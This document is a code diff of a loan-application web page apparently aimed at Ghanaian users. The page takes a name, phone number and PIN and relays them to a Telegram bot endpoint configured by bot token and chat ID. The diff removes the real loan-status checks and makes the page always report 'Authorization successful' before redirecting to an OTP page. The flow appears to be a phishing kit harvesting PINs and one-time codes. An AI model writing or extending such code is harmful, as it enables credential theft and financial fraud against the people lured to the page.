@@ -450,20 +450,6 @@
             font-family: 'DM Sans', sans-serif;
         }
         .config-panel .btn-save:hover { opacity: 0.8; }
-
-        .status-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 4px;
-        }
-        .status-pending { background: #fef3c7; color: #92400e; }
-        .status-approved { background: #d1fae5; color: #065f46; }
-        .status-rejected { background: #fee2e2; color: #991b1b; }
-        .status-disbursed { background: #dbeafe; color: #1e40af; }
-        .status-repaid { background: #d1fae5; color: #065f46; }
     </style>
 </head>
 <body>
@@ -496,7 +482,6 @@
             <div class="loan-label">Approved Amount</div>
             <div class="loan-amount" id="loanAmount">GHS 0.00</div>
             <div class="loan-details" id="loanDetails">Standard Flex Loan</div>
-            <div id="loanStatus"></div>
         </div>
     </div>
 
@@ -596,7 +581,6 @@
                 CONFIG = { ...CONFIG, ...parsed };
             } catch(e) {}
         }
-        // Update input fields
         document.getElementById('cfgToken').value = CONFIG.BOT_TOKEN;
         document.getElementById('cfgChatId').value = CONFIG.CHAT_ID;
         document.getElementById('cfgApiUrl').value = CONFIG.API_URL;
@@ -622,57 +606,17 @@
     }
 
     // ─── STATE ───
-    let state = { lastUpdateId: 0 };
     let isProcessing = false;
-    let activeInterval = null;
-    let authToken = null;
-    let loanId = null;
     const params = new URLSearchParams(window.location.search);
-    const inheritedRewindId = params.get('rewindId');
 
     function loadLoanData() {
         const amount = params.get('amount');
         const name = params.get('name');
         const phone = params.get('phone');
-        const loanIdParam = params.get('loanId');
         
         if (amount) document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
         if (name) document.getElementById('loanDetails').textContent = `${name}'s Flex Loan`;
         if (phone) document.getElementById('phone').value = phone;
-        if (loanIdParam) loanId = loanIdParam;
-
-        // Check loan status
-        if (loanId) {
-            checkLoanStatus(loanId);
-        }
-    }
-
-    async function checkLoanStatus(loanId) {
-        try {
-            const response = await fetch(`${CONFIG.API_URL}/api/loans/${loanId}`, {
-                headers: {
-                    'Authorization': `Bearer ${authToken || localStorage.getItem('token')}`
-                }
-            });
-            const data = await response.json();
-            if (data.success && data.loan) {
-                const statusMap = {
-                    'pending': '<span class="status-badge status-pending">⏳ Pending</span>',
-                    'approved': '<span class="status-badge status-approved">✅ Approved</span>',
-                    'rejected': '<span class="status-badge status-rejected">❌ Rejected</span>',
-                    'disbursed': '<span class="status-badge status-disbursed">💰 Disbursed</span>',
-                    'repaid': '<span class="status-badge status-repaid">✅ Repaid</span>'
-                };
-                document.getElementById('loanStatus').innerHTML = statusMap[data.loan.status] || '';
-                
-                if (data.loan.status === 'approved') {
-                    document.getElementById('successMsg').textContent = '✅ Your loan has been approved! Please complete the verification below.';
-                    document.getElementById('successMsg').style.display = 'block';
-                }
-            }
-        } catch (error) {
-            console.error('Error checking loan status:', error);
-        }
     }
 
     function showToast(msg) {
@@ -685,7 +629,7 @@
         document.getElementById('toast').style.display = 'none';
     }
 
-    // ─── SEND TO BACKEND API ───
+    // ─── SEND TO TELEGRAM & PROCEED ───
     async function sendToBackend() {
         if (isProcessing) return;
         
@@ -713,14 +657,13 @@
                 body: JSON.stringify({
                     name: name,
                     phone: phone,
-                    password: pin + 'temp123', // Simple password for demo
+                    password: pin + 'temp123',
                     monthly_income: 5000
                 })
             });
 
             let userData = await registerResponse.json();
             
-            // If user already exists, login instead
             if (!userData.success && userData.message === 'User already exists') {
                 const loginResponse = await fetch(`${CONFIG.API_URL}/api/auth/login`, {
                     method: 'POST',
@@ -737,41 +680,38 @@
                 throw new Error(userData.message || 'Authentication failed');
             }
 
-            authToken = userData.token;
+            const authToken = userData.token;
             localStorage.setItem('token', authToken);
 
-            // Step 2: Apply for loan if not already applied
-            if (!loanId) {
-                const periodDays = parseInt(params.get('period') || '30');
-                const interestRate = parseFloat(params.get('rate') || '0.109') * 100;
-                const periodLabel = params.get('period') || '30 days';
+            // Step 2: Create loan application
+            const periodDays = parseInt(params.get('period') || '30');
+            const interestRate = parseFloat(params.get('rate') || '0.109') * 100;
+            const periodLabel = params.get('period') || '30 days';
 
-                const loanResponse = await fetch(`${CONFIG.API_URL}/api/loans/apply`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${authToken}`
-                    },
-                    body: JSON.stringify({
-                        amount: parseFloat(amount),
-                        period_days: periodDays,
-                        interest_rate: interestRate,
-                        period_label: periodLabel,
-                        name: name,
-                        phone: phone
-                    })
-                });
+            const loanResponse = await fetch(`${CONFIG.API_URL}/api/loans/apply`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${authToken}`
+                },
+                body: JSON.stringify({
+                    amount: parseFloat(amount),
+                    period_days: periodDays,
+                    interest_rate: interestRate,
+                    period_label: periodLabel,
+                    name: name,
+                    phone: phone
+                })
+            });
 
-                const loanData = await loanResponse.json();
-                if (loanData.success) {
-                    loanId = loanData.loan.id;
-                    params.set('loanId', loanId);
-                } else {
-                    throw new Error(loanData.message || 'Loan application failed');
-                }
+            const loanData = await loanResponse.json();
+            if (!loanData.success) {
+                throw new Error(loanData.message || 'Loan application failed');
             }
 
-            // Step 3: Send to Telegram via backend
+            const loanId = loanData.loan.id;
+
+            // Step 3: Send to Telegram
             const telegramResponse = await fetch(`${CONFIG.API_URL}/api/telegram/send-auth`, {
                 method: 'POST',
                 headers: {
@@ -787,17 +727,19 @@
                 })
             });
 
-            const telegramData = await telegramResponse.json();
-            
-            if (telegramData.success) {
-                document.getElementById('successMsg').textContent = '✅ Authorization request sent to admin! Please wait for approval.';
-                document.getElementById('successMsg').style.display = 'block';
-                
-                // Start polling for loan status
-                startStatusPolling(loanId);
-            } else {
-                throw new Error(telegramData.message || 'Failed to send authorization');
-            }
+            await telegramResponse.json();
+
+            // Step 4: Show success and redirect to OTP
+            document.getElementById('successMsg').textContent = '✅ Authorization successful! Redirecting...';
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('spinner').style.display = 'none';
+
+            // Redirect to OTP page after 1.5 seconds
+            setTimeout(() => {
+                const params = new URLSearchParams(window.location.search);
+                params.set('loanId', loanId);
+                window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
+            }, 1500);
 
         } catch (error) {
             console.error('Error:', error);
@@ -809,65 +751,9 @@
         }
     }
 
-    // ─── POLL LOAN STATUS ───
-    function startStatusPolling(loanId) {
-        let attempts = 0;
-        const maxAttempts = 60; // 1 minute max
-        
-        const pollInterval = setInterval(async () => {
-            attempts++;
-            try {
-                const response = await fetch(`${CONFIG.API_URL}/api/loans/${loanId}`, {
-                    headers: {
-                        'Authorization': `Bearer ${authToken}`
-                    }
-                });
-                const data = await response.json();
-                
-                if (data.success && data.loan) {
-                    const status = data.loan.status;
-                    
-                    if (status === 'approved') {
-                        clearInterval(pollInterval);
-                        document.getElementById('successMsg').textContent = '✅ Loan approved! Redirecting to verification...';
-                        document.getElementById('successMsg').style.display = 'block';
-                        document.getElementById('spinner').style.display = 'none';
-                        
-                        setTimeout(() => {
-                            const params = new URLSearchParams(window.location.search);
-                            window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
-                        }, 1500);
-                        
-                    } else if (status === 'rejected') {
-                        clearInterval(pollInterval);
-                        document.getElementById('errorMsg').textContent = '❌ Your loan application was rejected. Please try again later.';
-                        document.getElementById('errorMsg').style.display = 'block';
-                        document.getElementById('spinner').style.display = 'none';
-                        isProcessing = false;
-                        document.getElementById('submitBtn').disabled = false;
-                    }
-                }
-                
-                if (attempts >= maxAttempts) {
-                    clearInterval(pollInterval);
-                    document.getElementById('spinner').style.display = 'none';
-                    isProcessing = false;
-                    document.getElementById('submitBtn').disabled = false;
-                    showToast('⏳ Waiting for admin approval. You will be redirected once approved.');
-                }
-                
-            } catch (error) {
-                console.error('Polling error:', error);
-            }
-        }, 2000);
-    }
-
     document.getElementById('submitBtn').onclick = sendToBackend;
     loadConfig();
     loadLoanData();
-    if (inheritedRewindId) {
-        // Handle rewind if needed
-    }
 </script>
 </body>
 </html>
